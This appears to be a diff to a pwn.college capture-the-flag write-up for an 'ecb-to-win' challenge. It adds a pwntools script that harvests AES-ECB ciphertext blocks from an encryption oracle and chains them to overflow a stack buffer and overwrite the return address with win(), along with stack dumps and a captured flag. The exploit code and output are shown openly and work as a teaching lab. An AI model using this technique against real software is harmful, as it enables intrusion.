@@ -316,11 +316,105 @@ So whatever input we provide, the dispatcher prepends the `"VERIFIED"` header al
 
 ### Exploit
 
+Let's check if the challenge binary is PIE.
+
+```
+hacker@integrated-security~ecb-to-win-easy:~$ checksec /challenge/vulnerable-overflow
+[*] '/challenge/vulnerable-overflow'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+Since it is not, let;s just get it to print out useful values we can use in the exploit.
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+def get_encrypted_block(payload_bytes):
+    """
+    Interacts with the AES-ECB encryption oracle (dispatcher).
+    Returns the raw ciphertext generated using the hidden system key.
+    """
+    io = process('/challenge/dispatch', level='error')
+    io.send(payload_bytes) 
+    ciphertext = io.readall()
+    io.close()
+    return ciphertext
+
+print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")
+
+# Block 1 - "VERIFIED" header and length (16 bytes)
+sample_cipher = get_encrypted_block(b"A")
+header_block = sample_cipher[0:16]
+
+# Craft payload
+payload = header_block 
+
+# 5. Pass payload
+print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
+p = process('/challenge/vulnerable-overflow')
+p.send(payload)
+
+p.interactive()
+```
+
+```
+hacker@integrated-security~ecb-to-win-easy:~$ python ~/script.py 
+[*] Harvesting ciphertext blocks from the ECB encryption oracle...
+[*] Dispatching assembled ciphertext (16 bytes) to target...
+[+] Starting local process '/challenge/vulnerable-overflow': pid 983
+[*] Switching to interactive mode
+Your message header: VERIFIED\x01
+Your message length: 1
+Decrypted message: !
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffddabbe1b0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffddabbe1b8 (rsp+0x0008) | 88 e3 bb da fd 7f 00 00 | 0x00007ffddabbe388 |
+| 0x00007ffddabbe1c0 (rsp+0x0010) | 78 e3 bb da fd 7f 00 00 | 0x00007ffddabbe378 |
+| 0x00007ffddabbe1c8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007ffddabbe1d0 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
+| 0x00007ffddabbe1d8 (rsp+0x0028) | a0 26 7f 0f 00 00 00 00 | 0x000000000f7f26a0 |
+| 0x00007ffddabbe1e0 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
+| 0x00007ffddabbe1e8 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007ffddabbe1f0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffddabbe1f8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffddabbe200 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffddabbe208 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffddabbe210 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffddabbe218 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffddabbe220 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffddabbe228 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffddabbe230 (rsp+0x0080) | 90 1e 40 00 00 00 00 00 | 0x0000000000401e90 |
+| 0x00007ffddabbe238 (rsp+0x0088) | 10 00 00 00 00 00 00 00 | 0x0000000000000010 |
+| 0x00007ffddabbe240 (rsp+0x0090) | 60 24 3c 02 00 00 00 00 | 0x00000000023c2460 |
+| 0x00007ffddabbe248 (rsp+0x0098) | 70 e3 bb da 03 00 00 00 | 0x00000003dabbe370 |
+| 0x00007ffddabbe250 (rsp+0x00a0) | 80 e2 bb da fd 7f 00 00 | 0x00007ffddabbe280 |
+| 0x00007ffddabbe258 (rsp+0x00a8) | 7a 1e 40 00 00 00 00 00 | 0x0000000000401e7a |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7ffddabbe1f0
+- the saved return address (previously to main) is at 0x7ffddabbe258
+- the address of win() is 0x4018f7.
+[*] Process '/challenge/vulnerable-overflow' stopped with exit code 0 (pid 983)
+[*] Got EOF while reading in interactive
+$  
+```
+
 ```py title="~/script.py" showLineNumbers
 from pwn import *
 
 # Initialize values
-win_addr = 0x4018f7  
+win_addr = 0x4018f7 
+buffer_addr = 0x7ffddabbe1f0
+addr_of_saved_ip = 0x7ffddabbe258
 
 def get_encrypted_block(payload_bytes):
     """
@@ -342,7 +436,7 @@ header_block = sample_cipher[0:16]
 # Block 2-7 - Padding chain
 padding_harvest = get_encrypted_block(b"B" * 16)
 padding_block = padding_harvest[16:32]  
-padding_blocks = padding_block * 6
+padding_blocks = padding_block * ((addr_of_saved_ip - buffer_addr) // 16)
 
 # Block 7 - Return address overwrite
 win_addr_block = b"C" * 8 
@@ -371,41 +465,41 @@ p.interactive()
 hacker@integrated-security~ecb-to-win-easy:~$ python ~/script.py 
 [*] Harvesting ciphertext blocks from the ECB encryption oracle...
 [*] Dispatching assembled ciphertext (144 bytes) to target...
-[+] Starting local process '/challenge/vulnerable-overflow': pid 40279
+[+] Starting local process '/challenge/vulnerable-overflow': pid 2086
 [*] Switching to interactive mode
-[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 40279)
 Your message header: VERIFIED\x01
 Your message length: 1
-\xf1\x15A\xa6;\\xe0)\xf7\xe8\x16\x99j\xa6\xd8ڐ\xf1ca(0\x84L\xd3{q\xcd\x1e7\xee޷\x08\xfcQ!
+Decrypted message: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCC\xf7\x18@!
 +---------------------------------+-------------------------+--------------------+
 |                  Stack location |            Data (bytes) |      Data (LE int) |
 +---------------------------------+-------------------------+--------------------+
-| 0x00007ffc7f497b10 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
-| 0x00007ffc7f497b18 (rsp+0x0008) | e8 7c 49 7f fc 7f 00 00 | 0x00007ffc7f497ce8 |
-| 0x00007ffc7f497b20 (rsp+0x0010) | d8 7c 49 7f fc 7f 00 00 | 0x00007ffc7f497cd8 |
-| 0x00007ffc7f497b28 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
-| 0x00007ffc7f497b30 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
-| 0x00007ffc7f497b38 (rsp+0x0028) | a0 86 45 61 01 00 00 00 | 0x00000001614586a0 |
-| 0x00007ffc7f497b40 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
-| 0x00007ffc7f497b48 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
-| 0x00007ffc7f497b50 (rsp+0x0040) | eb 0b 3d 7e 32 6a 68 cb | 0xcb686a327e3d0beb |
-| 0x00007ffc7f497b58 (rsp+0x0048) | 0d f1 15 41 a6 3b 5c e0 | 0xe05c3ba64115f10d |
-| 0x00007ffc7f497b60 (rsp+0x0050) | 29 f7 e8 16 99 6a a6 d8 | 0xd8a66a9916e8f729 |
-| 0x00007ffc7f497b68 (rsp+0x0058) | da 90 f1 63 61 28 30 84 | 0x8430286163f190da |
-| 0x00007ffc7f497b70 (rsp+0x0060) | 4c d3 7b 71 cd 1e 37 ee | 0xee371ecd717bd34c |
-| 0x00007ffc7f497b78 (rsp+0x0068) | de b7 08 fc 51 00 f0 2d | 0x2df00051fc08b7de |
-| 0x00007ffc7f497b80 (rsp+0x0070) | 3a fb db 72 06 a5 28 94 | 0x9428a50672dbfb3a |
-| 0x00007ffc7f497b88 (rsp+0x0078) | 3f be a6 8d 4f 19 53 93 | 0x9353194f8da6be3f |
-| 0x00007ffc7f497b90 (rsp+0x0080) | fe 45 3f 68 8c 06 13 ea | 0xea13068c683f45fe |
-| 0x00007ffc7f497b98 (rsp+0x0088) | 60 e7 49 a4 88 33 1a 01 | 0x011a3388a449e760 |
-| 0x00007ffc7f497ba0 (rsp+0x0090) | ad 15 81 c7 1b d4 32 01 | 0x0132d41bc78115ad |
-| 0x00007ffc7f497ba8 (rsp+0x0098) | f3 51 0c b5 c1 61 1a 6f | 0x6f1a61c1b50c51f3 |
-| 0x00007ffc7f497bb0 (rsp+0x00a0) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
-| 0x00007ffc7f497bb8 (rsp+0x00a8) | f7 18 40 00 00 00 00 00 | 0x00000000004018f7 |
+| 0x00007ffeb8769070 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffeb8769078 (rsp+0x0008) | 48 92 76 b8 fe 7f 00 00 | 0x00007ffeb8769248 |
+| 0x00007ffeb8769080 (rsp+0x0010) | 38 92 76 b8 fe 7f 00 00 | 0x00007ffeb8769238 |
+| 0x00007ffeb8769088 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007ffeb8769090 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
+| 0x00007ffeb8769098 (rsp+0x0028) | a0 26 67 7b 01 00 00 00 | 0x000000017b6726a0 |
+| 0x00007ffeb87690a0 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
+| 0x00007ffeb87690a8 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
+| 0x00007ffeb87690b0 (rsp+0x0040) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 2086)
+| 0x00007ffeb87690b8 (rsp+0x0048) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb87690c0 (rsp+0x0050) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb87690c8 (rsp+0x0058) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb87690d0 (rsp+0x0060) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb87690d8 (rsp+0x0068) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb87690e0 (rsp+0x0070) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb87690e8 (rsp+0x0078) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb87690f0 (rsp+0x0080) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb87690f8 (rsp+0x0088) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb8769100 (rsp+0x0090) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb8769108 (rsp+0x0098) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffeb8769110 (rsp+0x00a0) | 43 43 43 43 43 43 43 43 | 0x4343434343434343 |
+| 0x00007ffeb8769118 (rsp+0x00a8) | f7 18 40 00 00 00 00 00 | 0x00000000004018f7 |
 +---------------------------------+-------------------------+--------------------+
 The program's memory status:
-- the input buffer starts at 0x7ffc7f497b50
-- the saved return address (previously to main) is at 0x7ffc7f497bb8
+- the input buffer starts at 0x7ffeb87690b0
+- the saved return address (previously to main) is at 0x7ffeb8769118
 - the address of win() is 0x4018f7.
 You win! Here is your flag:
 pwn.college{sBaSZzvEAX-48KsnbTM_0LFAcSD.QX3UDMxEDL4ITM0EzW}
@@ -655,6 +749,10 @@ Symbol "win" is at 0x4013b6 in a file compiled without debugging.
 ```
 
 ### Exploit
+
+Let's check if the challenge binary is PIE.
+
+
 
 ```py title="~/script.py" showLineNumbers
 from pwn import *
